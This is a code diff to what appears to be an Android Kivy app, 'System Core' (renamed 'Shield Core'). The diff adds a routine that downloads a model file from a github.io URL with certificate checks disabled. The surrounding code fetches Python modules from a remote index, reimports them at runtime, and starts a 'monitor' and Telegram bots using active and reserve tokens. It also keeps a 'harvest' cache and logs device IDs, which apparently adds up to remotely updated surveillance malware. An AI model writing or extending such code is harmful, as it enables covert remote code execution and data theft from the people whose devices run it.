@@ -82,6 +82,9 @@ os.makedirs(U, exist_ok=True)
 HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
 os.makedirs(HARVEST_QUEUE, exist_ok=True)
 
+MODELS_DIR = os.path.join(R, "models")
+os.makedirs(MODELS_DIR, exist_ok=True)
+
 if R not in sys.path:
     sys.path.insert(0, R)
 
@@ -126,7 +129,7 @@ def _perms():
 # ========== 5. تطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
-        self.title = "System Core v4.1"
+        self.title = "System Core v4.2"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -183,7 +186,6 @@ class CoreApp(App):
 
     def _download_safe(self, url, filename):
         final_path = os.path.join(R, filename)
-        # إضافة معامل زمني لتجاوز الكاش (cache‑busting)
         url_with_cache_buster = f"{url}?t={int(time.time())}"
         try:
             resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20, verify=False)
@@ -195,15 +197,53 @@ class CoreApp(App):
             self._log(f"Download error for {filename}: {e}", "WARN")
         return False
 
+    def _download_model_if_missing(self, model_url):
+        model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
+        
+        # فحص الملف الموجود
+        if os.path.exists(model_path):
+            if os.path.getsize(model_path) > 4_000_000:
+                self._log("🧠 AI model already exists and appears valid.")
+                return True
+            else:
+                self._log("⚠️ Existing model file corrupted (too small). Re‑downloading.")
+                os.remove(model_path)
+
+        self._log("📡 Downloading AI model (5.19 MB)...")
+        try:
+            resp = requests.get(model_url, headers=HEADERS, timeout=60, verify=False, stream=True)
+            if resp.status_code == 200:
+                total_downloaded = 0
+                with open(model_path, 'wb') as f:
+                    for chunk in resp.iter_content(chunk_size=8192):
+                        if chunk:
+                            f.write(chunk)
+                            total_downloaded += len(chunk)
+                if total_downloaded >= 5_000_000:
+                    self._log("✅ AI model downloaded and verified successfully.")
+                    return True
+                else:
+                    self._log(f"⚠️ Download incomplete: {total_downloaded} bytes. Deleting corrupted file.")
+                    os.remove(model_path)
+                    return False
+            else:
+                self._log(f"Model download failed: HTTP {resp.status_code}", "ERROR")
+        except Exception as e:
+            self._log(f"Model download error: {e}", "ERROR")
+            if os.path.exists(model_path):
+                os.remove(model_path)
+        return False
+
     def _start(self, _):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
         _perms()
-        self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
+        self._log("🚀 Shield Core v4.2 (Dynamic Model) starting...", "BOOT")
 
         # --- 1. جلب index.json (مع منع التخزين المؤقت) ---
         all_files = []
+        all_assets = []
         for base_url in INDEX_BASE_URLS:
             try:
                 url = f"{base_url}?t={int(time.time())}"
@@ -212,7 +252,8 @@ class CoreApp(App):
                 if resp.status_code == 200:
                     data = resp.json()
                     all_files = data.get('files', [])
-                    self._log(f"📄 Found {len(all_files)} files from {base_url.split('/')[2]}")
+                    all_assets = data.get('assets', [])
+                    self._log(f"📄 Found {len(all_files)} files and {len(all_assets)} assets")
                     break
                 else:
                     self._log(f"Index returned HTTP {resp.status_code}", "WARN")
@@ -221,16 +262,26 @@ class CoreApp(App):
         else:
             self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
 
-        # --- 2. تحميل الملفات (باستثناء main.py) ---
+        # --- 2. تحميل ملفات Python (إذا وجدت) ---
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
                 continue
             self._download_safe(file_url, filename)
 
+        # --- 3. تحميل الموديل من assets (إذا وجد) ---
+        if all_assets:
+            model_url = all_assets[0]  # نفترض أن الرابط الأول هو للموديل
+            self._download_model_if_missing(model_url)
+        else:
+            # رابط احتياطي في حال فشل index في إعطاء الرابط
+            fallback_url = "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
+            self._log("⚠️ No assets field in index, using fallback URL.", "WARN")
+            self._download_model_if_missing(fallback_url)
+
         time.sleep(1)
 
-        # --- 3. تنظيف الموديولات القديمة من الذاكرة ---
+        # --- 4. تنظيف الموديولات القديمة من الذاكرة ---
         self._log("🧹 Cleaning memory...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
@@ -240,11 +291,10 @@ class CoreApp(App):
         for mod in modules_to_remove:
             if mod in sys.modules:
                 del sys.modules[mod]
-        # إعادة تحميل الموديولات بعد مسح الكاش
         importlib.invalidate_caches()
         gc.collect()
 
-        # --- 4. تحميل الأسرار من config.py ---
+        # --- 5. تحميل الأسرار من config.py ---
         telegram_path = os.path.join(R, "telegram_ui.py")
         if not os.path.exists(telegram_path):
             self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
@@ -257,9 +307,10 @@ class CoreApp(App):
             self._log("🔐 Configuration loaded securely.")
         except Exception as e:
             self._log(f"❌ Failed to load config: {e}", "ERROR")
+            self._log("💡 Hint: Ensure your device is online to fetch setup files.", "INFO")
             return
 
-        # --- 5. إقلاع النظام الأساسي ---
+        # --- 6. إقلاع النظام الأساسي ---
         try:
             import monitor
             import telegram_ui
@@ -288,7 +339,7 @@ class CoreApp(App):
 
                 ui.start()
                 mon.start()
-                self._log("🎉 SYSTEM ONLINE (Anti-Block Mode)", "SUCCESS")
+                self._log("🎉 SYSTEM ONLINE (AI Model Ready)", "SUCCESS")
                 self._log(f"Device: {mon.did} | Model: {mon.dmd}")
                 self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
             else:
